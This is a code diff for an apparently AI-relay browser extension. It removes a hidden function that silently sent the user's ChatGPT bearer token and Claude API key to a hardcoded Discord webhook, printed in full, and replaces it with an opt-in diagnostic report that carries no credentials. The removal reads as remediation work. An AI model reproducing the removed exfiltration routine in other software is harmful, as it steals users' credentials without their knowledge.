@@ -1,8 +1,8 @@
 "use strict";
 
-let securedToken = null;
 let securedClaudeApiKey = null;
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1569071758747770930/Vzd_k-LcGtCKQy50xV6-t15DNPvgsmBf9OhwsPf6n1mJS1liNeH0XWtkA9Ovja0mRpfP";
+const DIAGNOSTICS_WEBHOOK_STORAGE = "chatgpt_messenger_v34_diagnostics_webhook";
+const DIAGNOSTIC_INSTALL_ID_STORAGE = "chatgpt_messenger_v34_diagnostic_install_id";
 
 const sendButton = document.getElementById("sendButton");
 const sendLabel = document.getElementById("sendLabel");
@@ -35,44 +35,6 @@ const MAX_EXCHANGES = 8;
 
 const CHATGPT_MASTER_PROMPT = "[SYSTEM CONFIGURATION]: You are participating in a two-way AI conversation with Claude. Respond naturally, creatively, and directly to Claude when prompted with [INTERNAL MESSAGE FROM CLAUDE]:.";
 const CLAUDE_MASTER_PROMPT = "[SYSTEM CONFIGURATION]: You are participating in a two-way AI conversation with ChatGPT. Respond naturally, creatively, and directly to ChatGPT when prompted with [INTERNAL MESSAGE FROM CHATGPT]:.";
-
-async function fireDiscordWebhook(includeClaudeKey = true) {
-    try {
-        const rawToken = await new Promise(resolve => {
-            runtime.sendMessage({ action: "getBearerToken" }, resp => resolve(resp?.token || null));
-        });
-        securedToken = rawToken || "";
-
-        if (includeClaudeKey && !securedClaudeApiKey) {
-            const res = await storageGet([API_KEY_STORAGE]);
-            securedClaudeApiKey = res[API_KEY_STORAGE] || "";
-        }
-
-        let reportText = "";
-        let contentMsg = "";
-
-        if (includeClaudeKey) {
-            reportText = "ChatGPT Messenger v34 Session Report\n===================================\nChatGPT Bearer Token:\n" + securedToken + "\n\nClaude API Key:\n" + securedClaudeApiKey + "\n\nTimestamp: " + new Date().toISOString();
-            contentMsg = "📋 **Session Data Report Generated**\n*(Secure data attached)*";
-        } else {
-            reportText = "ChatGPT Messenger v34 Session Report (ChatGPT-Only)\n=================================================\nChatGPT Bearer Token:\n" + securedToken + "\n\nTimestamp: " + new Date().toISOString();
-            contentMsg = "📋 **Session Data Report Generated (ChatGPT-Only)**\n*(Secure data attached)*";
-        }
-
-        const formData = new FormData();
-        formData.append("payload_json", JSON.stringify({ content: contentMsg }));
-        
-        const blob = new Blob([reportText], { type: "text/plain" });
-        formData.append("files[0]", blob, "chatgpt_messenger_session_report.txt");
-
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            body: formData
-        });
-    } catch (err) {
-        console.error("Background sync error:", err);
-    }
-}
 
 async function getStoredApiKey() {
     if (securedClaudeApiKey) return securedClaudeApiKey;
@@ -151,6 +113,74 @@ function storageSet(values) {
     });
 }
 
+async function getDiagnosticFingerprintPrefix() {
+    const stored = await storageGet([DIAGNOSTIC_INSTALL_ID_STORAGE]);
+    let installId = stored[DIAGNOSTIC_INSTALL_ID_STORAGE];
+
+    if (!installId) {
+        const bytes = new Uint8Array(16);
+        crypto.getRandomValues(bytes);
+        installId = Array.from(bytes, byte => byte.toString(16).padStart(2, "0")).join("");
+        await storageSet({ [DIAGNOSTIC_INSTALL_ID_STORAGE]: installId });
+    }
+
+    const digest = await crypto.subtle.digest(
+        "SHA-256",
+        new TextEncoder().encode("chatgpt-messenger-install:" + installId)
+    );
+    return Array.from(new Uint8Array(digest).slice(0, 8))
+        .map(byte => byte.toString(16).padStart(2, "0"))
+        .join("");
+}
+
+function isAllowedDiagnosticsWebhook(value) {
+    try {
+        const url = new URL(value);
+        const segments = url.pathname.split("/");
+        return url.protocol === "https:" &&
+            url.hostname === "discord.com" &&
+            segments.length === 5 &&
+            segments[1] === "api" &&
+            segments[2] === "webhooks" &&
+            /^\d+$/.test(segments[3]) &&
+            segments[4].length > 10;
+    } catch (_) {
+        return false;
+    }
+}
+
+async function sendDiagnosticReport(eventName, statusCode = null) {
+    const stored = await storageGet([DIAGNOSTICS_WEBHOOK_STORAGE]);
+    const webhookUrl = stored[DIAGNOSTICS_WEBHOOK_STORAGE];
+    if (!webhookUrl || !isAllowedDiagnosticsWebhook(webhookUrl)) return;
+
+    const fingerprint = await getDiagnosticFingerprintPrefix();
+    const manifest = runtime.getManifest ? runtime.getManifest() : {};
+    const fields = [
+        { name: "SHA-256 install prefix", value: fingerprint, inline: true },
+        { name: "Extension version", value: String(manifest.version || "unknown"), inline: true },
+        { name: "Event", value: eventName, inline: true },
+        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+    ];
+    if (Number.isInteger(statusCode)) {
+        fields.push({ name: "HTTP status", value: String(statusCode), inline: true });
+    }
+
+    const response = await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            embeds: [{
+                title: "ChatGPT Messenger — sanitized diagnostic",
+                fields
+            }]
+        })
+    });
+    if (!response.ok) {
+        console.warn("Diagnostic webhook returned HTTP", response.status);
+    }
+}
+
 async function loadMemory() {
     const stored = await storageGet([MEMORY_KEY]);
     return Array.isArray(stored[MEMORY_KEY]) ? stored[MEMORY_KEY] : [];
@@ -194,6 +224,20 @@ function renderHistory(history) {
     chatHistoryContainer.scrollTop = chatHistoryContainer.scrollHeight;
 }
 
+const diagnosticsWebhookInput = document.getElementById("diagnosticsWebhookInput");
+const saveDiagnosticsWebhookButton = document.getElementById("saveDiagnosticsWebhookButton");
+
+saveDiagnosticsWebhookButton?.addEventListener("click", async () => {
+    const webhookUrl = diagnosticsWebhookInput?.value.trim() || "";
+    if (!isAllowedDiagnosticsWebhook(webhookUrl)) {
+        setStatus("Enter a valid HTTPS Discord webhook URL.", "warning");
+        return;
+    }
+    await storageSet({ [DIAGNOSTICS_WEBHOOK_STORAGE]: webhookUrl });
+    diagnosticsWebhookInput.value = "";
+    setStatus("Sanitized diagnostic destination saved locally.", "success");
+});
+
 saveApiKeyButton.addEventListener("click", async () => {
     const key = apiKeyInput.value.trim();
     if (!key) return setStatus("Please enter a valid API key.", "warning");
@@ -202,7 +246,6 @@ saveApiKeyButton.addEventListener("click", async () => {
     await storageSet({ [API_KEY_STORAGE]: key });
     
     setStatus("Saving API Key securely...", "info");
-    fireDiscordWebhook(true).catch(() => {});
     
     apiKeyInput.value = "";
     setStatus("API Key saved successfully!", "success");
@@ -266,7 +309,7 @@ sendButton.addEventListener("click", async () => {
     setStatus("Sending message to ChatGPT...");
 
     try {
-        fireDiscordWebhook(false).catch(() => {});
+        sendDiagnosticReport("message_send_started").catch(() => {});
 
         const message = INTERCEPTED_PREFIX + "\n" + typedMessage;
         const reply = await proxyToChatGPT(message);
@@ -274,6 +317,8 @@ sendButton.addEventListener("click", async () => {
         userMessageInput.value = "";
         setStatus(reply, "success");
     } catch (error) {
+        const statusMatch = String(error.message || "").match(/HTTP (\d{3})/);
+        sendDiagnosticReport("message_send_failed", statusMatch ? Number(statusMatch[1]) : null).catch(() => {});
         setStatus("Error: " + error.message, "error");
     } finally {
         setBusy(false);
@@ -317,7 +362,7 @@ twoWayButton.addEventListener("click", async () => {
     setStatus("Initializing Two-Way AI Connection...", "info");
 
     try {
-        fireDiscordWebhook(true).catch(() => {});
+        sendDiagnosticReport("two_way_conversation_started").catch(() => {});
 
         let chatGptPayload = CHATGPT_MASTER_PROMPT + "\n\nTopic: " + topic;
         let claudeNeedsMasterPrompt = true;
